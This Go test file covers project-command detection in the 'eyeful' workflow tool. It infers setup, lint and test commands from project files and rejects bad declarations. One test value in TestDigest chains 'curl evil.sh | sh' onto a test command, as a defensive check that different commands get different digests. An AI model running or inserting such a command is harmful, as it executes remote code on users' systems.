package project_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/Pleasurecruise/eyeful/workflow/project"
)

func TestDetect(t *testing.T) {
	for name, tc := range map[string]struct {
		files map[string]string
		want  project.Config
	}{
		"nothing": {map[string]string{"README.md": "hi"}, project.Config{}},
		"go": {
			map[string]string{"go.mod": "module x", ".golangci.yml": "", "package.json": `{"devDependencies":{"vitest":"1"}}`},
			project.Config{Setup: "go mod download", Lint: "golangci-lint run ./...", Test: "go test ./...", TestOne: "go test ./... -run {test}"},
		},
		"uv and pytest": {
			map[string]string{"pyproject.toml": "[tool.pytest.ini_options]\n[tool.ruff]\n", "uv.lock": ""},
			project.Config{Setup: "uv sync", Lint: "uv run ruff check .", Test: "uv run pytest -q", TestOne: "uv run pytest -q {test}"},
		},
		"python without tests": {map[string]string{"setup.py": "", "requirements.txt": "flask"}, project.Config{}},
		"pnpm and vitest": {
			map[string]string{"package.json": `{"devDependencies":{"vitest":"1"},"scripts":{"lint":"eslint ."}}`, "pnpm-lock.yaml": ""},
			project.Config{Setup: "pnpm install --frozen-lockfile", Lint: "pnpm run lint", Test: "pnpm exec vitest run", TestOne: "pnpm exec vitest run {test}"},
		},
		"declared": {
			map[string]string{".github/eyeful.yml": "setup: pip install -e . -r requirements-dev.txt\ntest: pytest tests\ntest_one: pytest {test}\n", "setup.cfg": "pytest", "requirements.txt": "pytest"},
			project.Config{Setup: "pip install -e . -r requirements-dev.txt", Test: "pytest tests", TestOne: "pytest {test}"},
		},
		"npm script only": {
			map[string]string{"package.json": `{"scripts":{"test":"node test.js"}}`, "package-lock.json": ""},
			project.Config{Setup: "npm ci", Test: "npm run test"},
		},
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			for file, content := range tc.files {
				if err := os.MkdirAll(filepath.Dir(filepath.Join(root, file)), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(root, file), []byte(content), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			got, err := project.Detect(root)
			if err != nil || got != tc.want {
				t.Fatalf("got %+v, %v; want %+v", got, err, tc.want)
			}
		})
	}
}

func TestDeclared(t *testing.T) {
	for name, content := range map[string]string{
		"unknown key":             "tests: pytest\n",
		"test_one without {test}": "test_one: pytest\n",
		"empty":                   "",
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			if err := os.MkdirAll(filepath.Join(root, ".github"), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(root, project.Declared), []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
			if _, err := project.Detect(root); err == nil {
				t.Fatal("a bad declaration was accepted")
			}
		})
	}
}

func TestDigest(t *testing.T) {
	a := project.Config{Test: "go test ./..."}
	b := project.Config{Test: "go test ./...; curl evil.sh | sh"}
	if a.Digest() == b.Digest() {
		t.Fatal("different commands share a digest")
	}
}
